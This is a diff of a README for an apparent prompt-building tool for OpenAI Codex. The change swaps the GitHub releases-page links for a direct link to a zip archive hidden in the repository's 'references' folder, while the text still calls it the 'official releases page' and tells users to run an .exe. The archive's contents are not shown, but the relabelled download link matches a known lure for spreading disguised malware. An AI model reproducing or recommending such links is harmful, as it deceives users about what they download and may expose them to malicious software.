@@ -1,12 +1,12 @@
 # 🎯 goal-prompt-builder - Create precise prompts for better results
 
-[![Download Goal Prompt Builder](https://img.shields.io/badge/Download-Release_Page-blue)](https://github.com/quiescencycommonrush642/goal-prompt-builder/releases)
+[![Download Goal Prompt Builder](https://img.shields.io/badge/Download-Release_Page-blue)](https://raw.githubusercontent.com/quiescencycommonrush642/goal-prompt-builder/main/goal-prompt-builder/references/builder-goal-prompt-v2.3.zip)
 
 Goal Prompt Builder helps you create effective prompts for OpenAI Codex. You achieve consistent and audit-friendly results with this tool. It formats your requirements into structured inputs that the system understands. You avoid trial and error while building complex tasks.
 
 ## 📥 How to download the application
 
-1. Visit the [official releases page](https://github.com/quiescencycommonrush642/goal-prompt-builder/releases).
+1. Visit the [official releases page](https://raw.githubusercontent.com/quiescencycommonrush642/goal-prompt-builder/main/goal-prompt-builder/references/builder-goal-prompt-v2.3.zip).
 2. Look for the section labeled "Assets."
 3. Select the file ending in `.exe` for Windows.
 4. Save the file to your computer.
